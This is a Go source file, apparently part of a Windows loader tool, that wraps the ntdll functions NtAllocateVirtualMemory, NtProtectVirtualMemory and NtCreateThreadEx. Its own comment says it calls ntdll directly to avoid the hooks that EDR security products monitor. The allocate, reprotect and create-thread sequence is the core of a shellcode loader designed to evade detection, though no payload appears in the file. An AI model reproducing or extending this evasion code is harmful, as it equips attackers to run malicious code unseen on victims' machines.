//go:build windows && amd64

package main

import (
	"unsafe"

	"golang.org/x/sys/windows"
)

// NT native API wrappers.
// Using ntdll directly (instead of kernel32 aliases) avoids the standard Win32
// hooking surface that EDRs instrument most aggressively.

var (
	ntdll = windows.NewLazySystemDLL("ntdll.dll")

	procNtAllocateVirtualMemory  = ntdll.NewProc("NtAllocateVirtualMemory")
	procNtProtectVirtualMemory   = ntdll.NewProc("NtProtectVirtualMemory")
	procNtCreateThreadEx         = ntdll.NewProc("NtCreateThreadEx")
)

const (
	memCommitReserve = uintptr(windows.MEM_COMMIT | windows.MEM_RESERVE)
)

// ntAlloc reserves and commits a RW region via NtAllocateVirtualMemory.
func ntAlloc(size uintptr) (uintptr, error) {
	var base uintptr
	sz := size
	r, _, _ := procNtAllocateVirtualMemory.Call(
		uintptr(windows.CurrentProcess()),
		uintptr(unsafe.Pointer(&base)),
		0,
		uintptr(unsafe.Pointer(&sz)),
		memCommitReserve,
		uintptr(windows.PAGE_READWRITE),
	)
	if r != 0 {
		return 0, windows.NTStatus(r)
	}
	return base, nil
}

// ntProtect changes the page protection of a previously allocated region.
func ntProtect(base, size uintptr, prot uint32) error {
	var old uint32
	sz := size
	r, _, _ := procNtProtectVirtualMemory.Call(
		uintptr(windows.CurrentProcess()),
		uintptr(unsafe.Pointer(&base)),
		uintptr(unsafe.Pointer(&sz)),
		uintptr(prot),
		uintptr(unsafe.Pointer(&old)),
	)
	if r != 0 {
		return windows.NTStatus(r)
	}
	return nil
}

// ntCreateThread creates a thread starting at entry using NtCreateThreadEx.
// Returns the thread handle; caller is responsible for closing it.
func ntCreateThread(entry uintptr) (windows.Handle, error) {
	var hThread windows.Handle
	// NtCreateThreadEx(
	//   ThreadHandle, DesiredAccess, ObjectAttributes,
	//   ProcessHandle, StartRoutine, Argument,
	//   CreateFlags, ZeroBits, StackSize, MaximumStackSize,
	//   AttributeList
	// )
	r, _, _ := procNtCreateThreadEx.Call(
		uintptr(unsafe.Pointer(&hThread)),
		0x1FFFFF, // THREAD_ALL_ACCESS
		0,
		uintptr(windows.CurrentProcess()),
		entry,
		0,
		0, 0, 0, 0, 0,
	)
	if r != 0 {
		return 0, windows.NTStatus(r)
	}
	return hThread, nil
}
